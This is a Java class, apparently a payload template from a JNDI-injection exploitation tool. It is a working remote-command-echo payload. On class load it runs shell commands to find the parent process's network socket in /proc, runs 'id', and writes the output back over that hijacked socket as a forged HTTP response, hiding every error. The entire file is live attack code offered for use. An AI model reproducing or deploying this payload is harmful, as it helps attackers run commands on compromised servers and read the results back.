package com.qi4l.jndi.template.echo;

public class LinuxEcho2 {

    static {
        try {
            if(java.io.File.separator.equals("/")){
                String command  = "ls -al /proc/$PPID/fd|grep socket:|awk 'BEGIN{FS=\"[\"}''{print $2}'|sed 's/.$//'";
                String[] cmd = new String[]{"/bin/sh", "-c", command};
                java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
                java.util.List res1 = new java.util.ArrayList();
                String line = "";
                while ((line = br.readLine()) != null && !line.trim().isEmpty()){
                    res1.add(line);
                }
                br.close();

                try {
                    Thread.sleep((long)2000);
                } catch (InterruptedException e) {
                    //pass
                }

                command  = "ls -al /proc/$PPID/fd|grep socket:|awk '{print $9, $11}'";
                cmd = new String[]{"/bin/sh", "-c", command};
                br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
                java.util.List res2 = new java.util.ArrayList();
                while ((line = br.readLine()) != null && !line.trim().isEmpty()){
                    res2.add(line);
                }
                br.close();

                int index = 0;
                int max = 0;
                for(int i = 0; i < res2.size(); i++){
                    try{
                        String socketNo = ((String)res2.get(i)).split("\\s+")[1].substring(8);
                        socketNo = socketNo.substring(0, socketNo.length() - 1);
                        for(int j = 0; j < res1.size(); j++){
                            if(!socketNo.equals(res1.get(j))) continue;

                            if(Integer.parseInt(socketNo) > max) {
                                max = Integer.parseInt(socketNo);
                                index = j;
                            }
                            break;
                        }
                    }catch(Exception e){
                        //pass
                    }
                }

                int fd = Integer.parseInt(((String)res2.get(index)).split("\\s")[0]);
                java.lang.reflect.Constructor c= java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
                c.setAccessible(true);
                cmd = new String[]{"/bin/sh", "-c", "id"};
                String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
                String result = "HTTP/1.1 200 OK\nConnection: close\nContent-Length: " + res.length() + "\n\n" + res + "\n";
                java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(new Object[]{new Integer(fd)}));
                os.write(result.getBytes());
            }
        } catch (Exception ignored) {
        }

    }

}
